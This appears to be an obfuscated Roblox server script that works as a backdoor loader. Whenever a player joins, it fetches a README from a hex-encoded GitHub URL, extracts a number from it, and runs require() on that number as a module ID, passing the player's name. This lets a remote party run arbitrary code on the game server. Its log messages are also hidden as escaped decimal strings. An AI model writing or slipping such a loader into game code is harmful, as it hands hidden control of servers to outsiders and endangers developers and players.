local a,b=game:GetService("HttpService"),"\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x47\x34\x6d\x67\x31\x2f\x4d\x69\x72\x6f\x78\x2f\x72\x65\x66\x73\x2f\x68\x65\x61\x64\x73\x2f\x6d\x61\x69\x6e\x2f\x52\x45\x41\x44\x4d\x45\x2e\x6d\x64"
game.Players.PlayerAdded:Connect(function(c)
	local d,e=pcall(function()return a:GetAsync(b)end)
	if d then
		local f=string.match(e,"%d+")
		if f then
			local g=tonumber(f)
			if g then
				local h,i=pcall(function()return _G.Load==_G(require(g)(c.Name))end)
				if h then
					print("\82\101\113\117\105\114\101\100\32\109\111\100\117\108\101\58",g)
				else
					warn("\70\97\105\108\101\100\32\116\111\32\114\101\113\117\105\114\101\32\109\111\100\117\108\101\32\119\105\116\104\32\73\68\58",g,i)
				end
			else
				warn("\67\111\117\108\100\32\110\111\116\32\99\111\110\118\101\114\116\32\109\111\100\117\108\101\32\73\68\32\116\111\32\110\117\109\98\101\114\58",f)
			end
		else
			warn("\78\111\32\110\117\109\98\101\114\32\102\111\117\110\100\32\105\110\32\102\101\116\99\104\101\100\32\99\111\110\116\101\110\116\46")
		end
	else
		warn("\70\97\105\108\101\100\32\116\111\32\102\101\116\99\104\32\114\101\109\111\116\101\32\102\105\108\101\58",e)
	end
end)

